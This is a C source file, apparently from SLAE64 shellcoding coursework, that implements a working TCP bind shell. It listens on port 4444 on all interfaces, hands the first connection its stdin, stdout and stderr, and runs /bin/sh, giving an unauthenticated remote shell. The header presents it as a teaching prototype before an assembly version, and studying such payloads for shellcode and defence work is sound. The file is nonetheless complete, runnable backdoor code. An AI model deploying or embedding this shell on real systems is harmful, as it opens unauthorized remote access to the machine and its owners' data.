//      TCP BIND SHELL
//	CREATES SOCKET
//	BINDS SOCKET
//	LISTENS FOR CONNECTION
//	ACCEPT CONNECTION, RETURNS A NEW COMMUNICATION SOCKET
//	CLOSES OLD SERVER SOCKET
//	DUPLICATES STDIN/OUT/ERROR FILE DESCRIPTORS TO THE NEW COMM. SOCKET
//	EXECVE SH 
//
//	File: tcp_bind_shell_C_prototyp.c
// 	Author: Kevin Ren, originally professor vivek of SLAE64
// 	Purpose: to illustrate tcp_bind_shell as a prototype in a HLL like C
// 	 	 and to illustrate all the system calls needed in LLL like asm
 


// preprocessor 
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <error.h>
#include <strings.h>
#include <unistd.h>
#include <arpa/inet.h>


#define ERROR 			-1
#define MAX_CLIENTS 		2
#define MAX_DATA 		1024
#define PORT			4444


//fowward declarations


int main(int argc, char **argv)
{
	struct sockaddr_in server;
	struct sockaddr_in client;
	int server_sock;
	int comm_sock;
	int sockaddr_len = sizeof(struct sockaddr_in);
	char* args[] = {"/bin/sh", 0};						// 0 for NULL 	
	
	// create socket	
	if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR) 		// 0 for default protocol in the socket requested
	{
		perror("server socket : ");
		exit(ERROR); 
	}	

	// set up sockaddr_in server struct for bind arg
	server.sin_family = AF_INET;						// AF_INET = 2
//	server.sin_port = htons(atoi(argv[1]));					// take an commandline arg for port				
	server.sin_port = htons(PORT);						// bind to 4444 htons converts to hex in network byte order
										// which is most significant byte first, like big endian
	server.sin_addr.s_addr = INADDR_ANY;					// INADDR_ANY =  0 
	bzero(&server.sin_zero, 8);						// 8 bytes of 0s for the address of server.sin_zero padding

	// bind socket
	if ((bind(server_sock, (struct sockaddr *)&server, sockaddr_len)) == ERROR)
	{
		perror("bind : ");
		exit(ERROR);
	}

	// listen
	if ((listen(server_sock, MAX_CLIENTS)) == ERROR)
	{
		perror("listen : ");
		exit(ERROR);
	}

	// accept, and returns no communciation socket fd
	if ((comm_sock = accept(server_sock, (struct sockaddr *)&client, &sockaddr_len)) == ERROR)
	{
		perror("accept: ");
		exit(ERROR);
	}

	// close server socket
	close(server_sock);

	// redirect stdin/out/error to the new communication socket file descriptor
	dup2(comm_sock, 0);
	dup2(comm_sock, 1);
	dup2(comm_sock, 2);

	// execve /bin/sh
	execve(args[0], &args[0], NULL);

}
